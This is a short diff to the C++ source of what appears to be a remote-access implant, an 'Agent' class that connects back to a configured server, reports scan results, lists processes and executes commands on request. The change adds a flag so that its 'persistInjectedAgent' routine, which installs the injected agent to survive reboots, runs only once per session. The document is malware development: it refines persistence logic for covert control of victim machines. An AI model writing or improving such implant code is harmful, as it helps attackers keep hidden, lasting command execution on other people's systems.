@@ -35,10 +35,10 @@
 
 namespace inferno {
 
-Agent::Agent() : m_server_ip("127.0.0.1"), m_server_port(4242), m_state(AgentState::INIT), m_running(false), m_reconnect_delay(MIN_BACKOFF) {}
+Agent::Agent() : m_server_ip("127.0.0.1"), m_server_port(4242), m_state(AgentState::INIT), m_running(false), m_persistence_installed(false), m_reconnect_delay(MIN_BACKOFF) {}
 
 Agent::Agent(const std::string& server_ip, uint16_t server_port)
-    : m_server_ip(server_ip), m_server_port(server_port), m_state(AgentState::INIT), m_running(false), m_reconnect_delay(MIN_BACKOFF) {}
+    : m_server_ip(server_ip), m_server_port(server_port), m_state(AgentState::INIT), m_running(false), m_persistence_installed(false), m_reconnect_delay(MIN_BACKOFF) {}
 
 Agent::~Agent() {
     stop();
@@ -215,8 +215,11 @@ void Agent::handleDispatching(Packet&& packet) {
         data = scan_res.serialize();
         m_socket.sendData(data);
 
-        // Persist for reboot survival
-        persistInjectedAgent(m_server_ip, m_server_port);
+        // Persist for reboot survival (only once per session)
+        if (!m_persistence_installed) {
+            persistInjectedAgent(m_server_ip, m_server_port);
+            m_persistence_installed = true;
+        }
     } else if (opcode == static_cast<uint16_t>(Opcode::PROC_LIST_REQ)) {
         handleProcessDiscovery();
     } else if (opcode == static_cast<uint16_t>(Opcode::CMD_EXEC)) {
